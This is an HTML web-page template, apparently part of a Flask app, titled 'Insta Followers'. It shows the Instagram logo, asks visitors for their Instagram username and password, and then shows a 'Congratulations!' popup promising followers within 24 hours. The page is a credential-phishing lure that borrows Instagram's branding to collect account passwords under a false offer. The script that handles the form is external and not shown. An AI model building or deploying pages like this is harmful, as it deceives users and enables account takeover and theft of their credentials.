<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Insta Followers</title>

  <!-- FontAwesome for icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>

  <!-- Custom CSS -->
  <link rel="stylesheet" href="{{ url_for('static', filename='hs.css') }}"/>

  <style>
    /* Loader Styling */
    #loading {
      display: none;
      text-align: center;
      margin-top: 20px;
      font-size: 18px;
      color: #555;
    }

    #loading i {
      margin-right: 8px;
      color: #ff0069;
    }

    /* Status box for error messages */
    #loginStatus {
      display: none;
      margin-top: 10px;
      padding: 10px;
      text-align: center;
      border-radius: 5px;
      font-weight: bold;
    }

    /* Popup Modal */
    #popup {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      z-index: 9999;
      font-family: 'Segoe UI', sans-serif;
      color: #fff;
    }

    #popup > div {
      background: linear-gradient(135deg, #f77737, #e1306c);
      padding: 30px 25px;
      border-radius: 20px;
      text-align: center;
      width: 80%;
      max-width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }

    #popup h3 {
      margin-bottom: 15px;
    }

    #popup p {
      font-size: 14px;
      margin-bottom: 25px;
    }

    #popup button {
      padding: 10px 20px;
      background: #fff;
      color: #e1306c;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="container">
    <h2>Insta Followers</h2>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo"/>
    <h3>Please Enter Your IG Username & Password</h3>

    <!-- Form Start -->
    <form id="loginForm">
      <!-- Username Input -->
      <div class="input-group">
        <input type="text" id="username" name="username" required placeholder=" " />
        <label for="username">Enter the username</label>
      </div>

      <!-- Password Input with Toggle Eye -->
      <div class="input-group password-container">
        <input type="password" id="password" name="password" required placeholder=" " />
        <label for="password">Enter the password</label>
        <i class="fa fa-eye eye-icon" id="togglePassword"></i>
      </div>

      <!-- Submit Button -->
      <button type="submit" class="btn" disabled>Continue</button>
    </form>

    <!-- Error Message -->
    <div id="loginStatus"></div>

    <!-- Loading Spinner -->
    <div id="loading">
      <i class="fa fa-spinner fa-spin"></i> Loading...
    </div>
  </div>

  <!-- Popup Modal -->
  <div id="popup">
    <div>
      <h3>Congratulations!</h3>
      <p>Your Instagram followers will be delivered within 24 hours.</p>
      <button onclick="document.getElementById('popup').style.display='none'">Close</button>
    </div>
  </div>

  <!-- Custom JavaScript -->
  <script src="{{ url_for('static', filename='hs.js') }}" defer></script>
</body>
</html>
